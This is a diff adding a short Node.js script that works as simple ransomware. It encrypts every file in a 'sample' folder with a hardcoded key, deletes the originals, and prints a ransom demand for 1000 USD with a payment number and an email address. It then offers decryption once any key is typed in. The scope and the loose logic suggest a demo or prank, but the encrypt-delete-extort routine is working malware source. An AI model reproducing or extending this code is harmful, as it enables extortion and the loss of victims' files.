@@ -1,0 +1,41 @@
+var encryptor = require('file-encryptor');
+var fs = require('fs')
+var readlineSync = require('readline-sync');
+
+var key = 'password!';
+
+
+
+;( async () => {
+
+    const testFolder = './sample/';
+
+await fs.readdirSync(testFolder).forEach(async file => {
+// Encrypt file.
+await encryptor.encryptFile(`${testFolder}/${file}`, `${testFolder}/${file},encrypted`, key, async function(err) {
+    await fs.unlinkSync(`${testFolder}/${file}`)
+    console.log(`File ${testFolder}/${file} is encrypted!`);
+});
+
+});
+
+console.log('Oh no! an unknown Virus has infected your files, Pay me 1000 USD in my gcash number:09123456789 to fix the problem,\nSend proof of payment in this email: VIRUSLAYER@gmail.com')
+
+
+// Wait for user's response.
+var decryptionKey = await readlineSync.question('ENTER DECRYPTION KEY: ');
+
+if (decryptionKey) {
+
+    await fs.readdirSync(testFolder).forEach(async file => {
+        // Encrypt file.
+        await encryptor.decryptFile(`${testFolder}/${file}`, `${testFolder}/${file}`.replace(',encrypted', ''), key, async function(err) {
+            await fs.unlinkSync(`${testFolder}/${file}`)
+            console.log(`File ${testFolder}/${file} is decrypted!`);
+        });
+        
+        });
+}
+
+
+})()
